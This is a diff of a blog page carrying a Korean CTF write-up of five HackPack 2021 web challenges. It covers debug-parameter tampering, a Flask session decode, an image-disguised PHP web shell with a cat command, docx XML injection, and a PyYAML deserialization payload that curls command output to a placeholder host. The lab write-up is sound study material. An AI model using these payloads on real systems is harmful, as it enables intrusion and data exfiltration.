@@ -399,14 +399,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><h1 id="HackPackCTF-2021-Write-Up"><a href="#HackPackCTF-2021-Write-Up" class="headerlink" title="HackPackCTF 2021 Write Up"></a>HackPackCTF 2021 Write Up</h1><p>Category: CTF, Web<br>Create Time: Apr 17, 2021 7:43 AM<br>Last Edited Time: Apr 17, 2021 8:39 AM</p>
-<h3 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h3><p>RITSEC CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)</p>
+  <h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://ctf2021.hackpack.club/team">https://ctf2021.hackpack.club/team</a></li>
 <li>pwnhub (jhyeon, owl, 3kk, MalHyuk)</li>
 <li>rank : 81th (400pt)</li>
 </ul>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Web-“N”ot-“G”am”I”ng-a”N”ymore-in-“X”mas"><a href="#Web-“N”ot-“G”am”I”ng-a”N”ymore-in-“X”mas" class="headerlink" title="[Web]  “N”ot “G”am”I”ng a”N”ymore in “X”mas"></a>[Web]  <strong>“N”ot “G”am”I”ng a”N”ymore in “X”mas</strong></h3><p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.46.32.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.46.32.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.46.32.png"></p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Web-“N”ot-“G”am”I”ng-a”N”ymore-in-“X”mas"><a href="#Web-“N”ot-“G”am”I”ng-a”N”ymore-in-“X”mas" class="headerlink" title="[Web]  “N”ot “G”am”I”ng a”N”ymore in “X”mas"></a>[Web]  <strong>“N”ot “G”am”I”ng a”N”ymore in “X”mas</strong></h3><p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__7.46.32.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__7.46.32.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.46.32.png"></p>
 <pre><code class="php">POST / HTTP/1.1
 Host: no-gaming-anymore-in-xmas.ctf2021.hackpack.club
 Connection: close
@@ -431,21 +430,21 @@ Cookie: _817ab=http://192.168.181.15:11000
 debug=0</code></pre>
 <p>이렇게 POST 요청 패킷을 잡아보면, debug라는 매개변수가 0으로 넘어가고 있다.</p>
 <p>이 변수의 값을 1로 고치면 된다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.47.42.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.47.42.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.47.42.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__7.47.42.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__7.47.42.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.47.42.png"></p>
 <p>그럼 이렇게 nginx.conf(설정 파일) 내용이 출력되는데, 플래그 경로가 /maybehereimportantstuff 라고</p>
 <p>친절히 알려주고 있으므로 해당 경로에 가서 플래그를 얻자</p>
 <p><code>flag&#123;ng1nx_m1sconf1g_c4n_b3_h4rmful&#125;</code></p>
 <hr>
-<h3 id="Web-All-about-resetting"><a href="#Web-All-about-resetting" class="headerlink" title="[Web] All about resetting"></a>[Web] All about resetting</h3><p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.49.28.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.49.28.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.49.28.png"></p>
+<h3 id="Web-All-about-resetting"><a href="#Web-All-about-resetting" class="headerlink" title="[Web] All about resetting"></a>[Web] All about resetting</h3><p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__7.49.28.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__7.49.28.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.49.28.png"></p>
 <p>문제 페이지에 가면 이렇게 로그인창이 하나 뜬다, 그런데 함정이다 로그인이 안된다.</p>
 <p>하지만, Forgot Password? 라는 것을 이용하면 된다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.50.32.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.50.32.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.50.32.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__7.50.32.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__7.50.32.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.50.32.png"></p>
 <p>그러면 이렇게 리셋창이 뜨면서 이메일을 입력하라고 나오는데, 이메일은 메인 페이지에서</p>
 <p>view source를 하면 이메일 힌트가 나온다.</p>
 <pre><code class="html">&lt;!-- Maintaned by Nikos (npantel@ncsu.edu) --&gt;</code></pre>
 <p>이 계정을 입력하고 넘어가면, 보안 질문이랍시고 하나뜨는데 첨엔 게싱인줄 알았으나 페이지 내 세션 값을</p>
 <p>확인해보니, Flask Session 세팅이 되어있었다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.52.06.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.52.06.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.52.06.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__7.52.06.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__7.52.06.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.52.06.png"></p>
 <pre><code class="html">session=.eJyrVkpLzMyJT84rUbIy0QFyyvKLMktS0_PLUovyEvOSU5WslLITszOLS_KTixKTK5UQakpSE3OBsvk5lbkFmYnJ-cVKtQBdfhye.YHoVAA.aycuGSStMwxhlgfa3ntQEuZ73FM</code></pre>
 <p>해당 세션 값을 Flask Session Decode 처리해주면, 세션에 어떤 내용이 들어있는지 확인할 수 있다.</p>
 <ul>
@@ -460,7 +459,7 @@ debug=0</code></pre>
 <p><code>flag = flag&#123;Wh4t_1s_th1s_gov3rn4nc3_!!!&#125;</code></p>
 <hr>
 <h3 id="Web-Indead-v1"><a href="#Web-Indead-v1" class="headerlink" title="[Web] Indead v1"></a>[Web] Indead v1</h3><p>누가 봐도 파일 업로드를 통해 웹 쉘을 띄우라는 문제이다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.56.28.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.56.28.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.56.28.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__7.56.28.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__7.56.28.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.56.28.png"></p>
 <p>그렇지만, 일반적으로 php 확장자를 쓰거나 php type을 가지는 파일은 업로드할 수 없고 오직</p>
 <p>“이미지 파일(jpg, png, gif)” 만 업로드가 가능했다.</p>
 <p>이는 문제 유형에 따라 단순 우회가 될 수 있고 조금 thinking을 해야 하는 경우도 있는데</p>
@@ -470,21 +469,21 @@ debug=0</code></pre>
 <p>php 웹 쉘을 만들고 나서 file signature 부분을 image로 인식할 수 있게 교묘하게 우회하면 된다.</p>
 <p>이렇게 웹 쉘을 업로드하고 나면, 경로를 찾아야 하는데 마침 업로드가 된 파일(이미지)를 홈페이지 내에</p>
 <p>불러와서 출력하는 기능이 있다. 해당 경로값을 따서 들어가면 된다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.00.52.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.00.52.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.00.52.png"></p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.02.01.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.02.01.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.02.01.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.00.52.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.00.52.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.00.52.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.02.01.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.02.01.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.02.01.png"></p>
 <p>플래그는 /var/www/flag.txt 에 있다고 하니 경로 내 파일을 읽어주면 된다.</p>
 <p>?cmd=cat /var/www/flag.txt</p>
 <p><code>flag&#123;y3t_an0ther_file_uplo@d_vuln&#125;</code></p>
 <hr>
 <h3 id="Web-Yaml-2-Json"><a href="#Web-Yaml-2-Json" class="headerlink" title="[Web] Yaml-2-Json"></a>[Web] Yaml-2-Json</h3><p>YAML 형식을 JSON으로 바꿔서 출력시켜주는 문제이다. 간단한 예제를 들어보면 아래와 같은 구조이다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/image.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/image.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/image.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/image.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/image.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/image.png"></p>
 <p><a target="_blank" rel="noopener" href="https://velog.io/@bloomspes/yaml-%ED%8C%8C%EC%9D%BC-%EC%9E%91%EC%84%B1-%EC%9A%94%EB%A0%B9-%EA%B8%B0%EC%B4%88%ED%8E%B8-%EC%8A%A4%ED%94%84%EB%A7%81%ED%8E%B8">https://velog.io/@bloomspes/yaml-파일-작성-요령-기초편-스프링편</a></p>
 <p>여기서 yaml 문법을 입력하면 결과적으로 json 문법으로 반환되어 출력되는데 이 과정에서 힌트를 얻을 수</p>
 <p>있었다. 패킷을 잡아보면 preimum이라는 매개변수가 세팅되어 날아가는데 이 값을 1로 고치면 PyYAML 이라는</p>
 <p>스폐셜(?) 프리미엄 기능을 사용할 수 있다고 한다. 그래서 PyYAML Deserialization 을 통한 Exploit이 가능</p>
 <p>할 것이라고 판단하고 아래와 같은 페이로드를 통해 내 서버로 output이 날아오게끔 세팅했다.</p>
 <pre><code class="json">!!python/object/apply:os.system [&quot;curl http://myip/?`ls`&quot;]</code></pre>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/2021-04-17_1.28.41.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/2021-04-17_1.28.41.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/2021-04-17_1.28.41.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__1.28.41.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__1.28.41.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/2021-04-17_1.28.41.png"></p>
 <p>그랬더니 정상적으로 출력값이 날아오길래, “/tmp/flag.txt” 에 플래그 파일이 있다는 설명을 보고 바로</p>
 <p>읽어서 문제를 풀이했다.</p>
 <p><code>flag&#123;Py_PyYaml_Yaml_Py&#125;</code></p>
@@ -492,8 +491,8 @@ debug=0</code></pre>
 <h3 id="Web-Indead-v2"><a href="#Web-Indead-v2" class="headerlink" title="[Web] Indead v2"></a>[Web] Indead v2</h3><p>이번 문제는 v1에 이어서 v2로 나온 문제이다. 같은 방법으로 파일 업로드를 하는 문제였지만 웹 쉘을 통한 문제는</p>
 <p>아니였다. 아래 사진과 같이 docx를 통해 내용을 입력하고 업로드 해보면 파일 안에 있는 문자를 파싱해서</p>
 <p>그 문자만 출력해주는 구조를 띄고있었다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.13.58.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.13.58.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.13.58.png"></p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.14.53.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.14.53.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.14.53.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.13.58.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.13.58.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.13.58.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.14.53.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.14.53.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.14.53.png"></p>
 <p>생각을 좀 해보니, XML 문서를 업로드해서 Injection 할 수 있지 않을까 라는 방법이 떠올랐고 실천했다.</p>
 <p>하지만 일단 docx 확장자만을 허용하니 docx로 위장할 수 있는 방법이 먼저 필요했다.</p>
 <p>그에 대한 해답은 python-docx 모듈을 사용해서 위장하는 방법이다.</p>
@@ -512,14 +511,14 @@ paragraph = document.add_paragraph(&#39;hi&#39;)
 document.save(&#39;exploit.docx&#39;)</code></pre>
 <p>코드를 실행하고 폴더에 보면 exploit.docx가 생겼을 것이다 이를 unzip으로 압축 해제하면 여러 xml</p>
 <p>파일이 나오는데 document.xml 파일을 target으로 injection 구문을 만들어주자.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.24.36.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.24.36.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.24.36.png"></p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.31.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.31.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.31.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.24.36.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.24.36.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.24.36.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.31.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.31.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.31.png"></p>
 <p>대충 이렇게 만들어주면 된다. 아까 paragraph로 만들어준 hi 부분을 출력부분으로 만들어주면 된다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.35.46.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.35.46.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.35.46.png"></p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.36.26.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.36.26.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.36.26.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.35.46.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.35.46.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.35.46.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.36.26.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.36.26.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.36.26.png"></p>
 <p>그리고 나서 다시 docx로 압축해서 파일을 업로드하면 된다.</p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.30.57.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.30.57.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.30.57.png"></p>
-<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.53.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.53.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.53.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.30.57.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.30.57.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.30.57.png"></p>
+<p><img src="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.53.png" class="lazyload" data-srcset="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.53.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.53.png"></p>
 <p><code>flag&#123;XML_is_ancestor_0f_every7hing_do_you_agree_?&#125;</code></p>
 <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
 <li>해당 글은 아래 노션에서도 확인하실 수 있습니다.</li>
@@ -631,7 +630,7 @@ https://public.jhyeon...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro-1"><span class="toc-number">2.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number"></span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E2%80%9CN%E2%80%9Dot-%E2%80%9CG%E2%80%9Dam%E2%80%9DI%E2%80%9Dng-a%E2%80%9DN%E2%80%9Dymore-in-%E2%80%9CX%E2%80%9Dmas"><span class="toc-number">1.</span> <span class="toc-text">[Web]  “N”ot “G”am”I”ng a”N”ymore in “X”mas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-All-about-resetting"><span class="toc-number">2.</span> <span class="toc-text">[Web] All about resetting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Indead-v1"><span class="toc-number">3.</span> <span class="toc-text">[Web] Indead v1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Yaml-2-Json"><span class="toc-number">4.</span> <span class="toc-text">[Web] Yaml-2-Json</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Indead-v2"><span class="toc-number">5.</span> <span class="toc-text">[Web] Indead v2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number"></span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E2%80%9CN%E2%80%9Dot-%E2%80%9CG%E2%80%9Dam%E2%80%9DI%E2%80%9Dng-a%E2%80%9DN%E2%80%9Dymore-in-%E2%80%9CX%E2%80%9Dmas"><span class="toc-number">1.</span> <span class="toc-text">[Web]  “N”ot “G”am”I”ng a”N”ymore in “X”mas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-All-about-resetting"><span class="toc-number">2.</span> <span class="toc-text">[Web] All about resetting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Indead-v1"><span class="toc-number">3.</span> <span class="toc-text">[Web] Indead v1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Yaml-2-Json"><span class="toc-number">4.</span> <span class="toc-text">[Web] Yaml-2-Json</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Indead-v2"><span class="toc-number">5.</span> <span class="toc-text">[Web] Indead v2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
     </div>
   </section>
 
